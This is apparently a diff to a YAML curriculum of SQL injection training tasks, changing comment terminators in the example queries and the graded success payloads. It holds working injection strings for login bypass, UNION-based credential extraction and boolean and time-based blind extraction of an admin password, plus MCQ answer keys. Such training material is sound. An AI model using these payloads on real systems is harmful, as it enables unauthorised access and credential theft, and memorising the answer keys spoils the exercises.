@@ -83,12 +83,12 @@ tasks:
       vulnerable_parameters:
         - username
         - password
-      success_payload: "admin' --"
-      expected_result: Successfully logged in as admin without knowing the password.
+      success_payload: "admin' -- -"
+      success_criteria: Successfully logged in as admin without knowing the password.
       hints:
         - Try using SQL comments to bypass the password check.
         - The application uses single quotes around the username.
-        - Remember that -- comments out the rest of the SQL query.
+        - Remember that -- followed by whitespace comments out the rest of the SQL query.
 
   - name: Union-Based SQL Injection
     description: Learn about Union-based SQL injection attacks to extract data.
@@ -109,15 +109,15 @@ tasks:
       Use `ORDER BY` to determine the number of columns:
 
       ```sql
-      ' ORDER BY 1--
-      ' ORDER BY 2--
-      ' ORDER BY 3--
+      ' ORDER BY 1-- -
+      ' ORDER BY 2-- -
+      ' ORDER BY 3-- -
       ```
 
       ### Union Attack Example
 
       ```sql
-      ' UNION SELECT username, password FROM users--
+      ' UNION SELECT username, password FROM users-- -
       ```
     mcq:
       question: What is required for a successful UNION-based SQL injection?
@@ -149,7 +149,7 @@ tasks:
           - name
           - price
           - description
-      success_payload: "' UNION SELECT id, username, password, email FROM users--"
+      success_payload: "' UNION SELECT id, username, password, email FROM users-- -"
       success_criteria: Extract all usernames and passwords from users table.
       hints:
         - First determine the number of columns using ORDER BY.
@@ -176,14 +176,14 @@ tasks:
       Use conditional statements to infer information:
 
       ```sql
-      ' AND 1=1--     -- Should return normal response
-      ' AND 1=2--     -- Should return different response
+      ' AND 1=1-- -     -- Should return normal response
+      ' AND 1=2-- -     -- Should return different response
       ```
 
       ### Data Extraction Example
 
       ```sql
-      ' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
+      ' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'-- -
       ```
     mcq:
       question: In Boolean-based blind SQL injection, how do you extract data?
@@ -206,7 +206,7 @@ tasks:
         - user_id
       blind_type: boolean
       target_data: admin_password
-      success_payload: "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p'--"
+      success_payload: "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p'-- -"
       success_criteria: Extract the first 5 characters of the admin password.
       expected_approach: Boolean-based character-by-character extraction.
       hints:
@@ -233,14 +233,14 @@ tasks:
       ### Testing Example
 
       ```sql
-      ' AND IF(1=1, SLEEP(5), 0)--
-      ' AND IF((SELECT COUNT(*) FROM users)>5, SLEEP(5), 0)--
+      ' AND IF(1=1, SLEEP(5), 0)-- -
+      ' AND IF((SELECT COUNT(*) FROM users)>5, SLEEP(5), 0)-- -
       ```
 
       ### Data Extraction
 
       ```sql
-      ' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p', SLEEP(5), 0)--
+      ' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p', SLEEP(5), 0)-- -
       ```
     mcq:
       question: What is the main indicator of successful time-based SQL injection?
@@ -264,7 +264,7 @@ tasks:
       database_type: mysql
       time_function: SLEEP
       target_data: admin_password_length
-      success_payload: "' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin')=8, SLEEP(5), 0)--"
+      success_payload: "' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin')=8, SLEEP(5), 0)-- -"
       success_criteria: Determine the length of the admin password using time delays.
       hints:
         - Use SLEEP(5) to create time delays.
@@ -313,4 +313,3 @@ tasks:
         - D) Encrypting database connections
       answer: C
 ---
-
